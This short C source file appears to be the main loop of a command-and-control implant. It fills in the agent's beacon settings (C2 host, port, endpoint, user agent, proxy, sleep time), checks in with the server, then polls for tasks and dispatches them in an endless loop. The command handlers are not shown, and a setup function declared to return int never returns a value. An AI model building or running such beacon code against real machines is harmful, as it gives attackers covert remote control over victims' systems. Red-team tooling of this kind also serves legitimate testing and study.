#include "main.h"


CONFIG_CORN corn_config = {0}; // initial

int SetupAgentConfig(void){
    corn_config.AgentID = (PCHAR)initUUID;
    corn_config.HostName = (PWCHAR)hostname;
    corn_config.HttpPort = (DWORD)httpport;
    corn_config.HttpMethod = (PWCHAR)httpmethod;
    corn_config.EndPoint = (PWCHAR)endpoint;
    corn_config.UserAgent = (PWCHAR)useragent;
    corn_config.IsSSL = (BOOL)isssl;
    corn_config.IsProxyEnabled = (BOOL)proxyenabled;
    corn_config.ProxyURL = (PWCHAR)proxyurl;
    corn_config.SleepTime = (UINT32)sleeptime;
}

int main(void){
    SetupAgentConfig();

    // prototype
    sendChekin();


    sleep(10);

    // command roop
    while(TRUE){

        PParser parser = sendAndReceive();
        BYTE taskCount = getTaskCount(parser);


        for(BYTE i = 0; i < taskCount; i++){
            PCommand cmd = tlvReadField(parser);
            PCmdResult result = dispatchCommand(cmd);
        }

        sleep(10);
    }














    return 0;
}

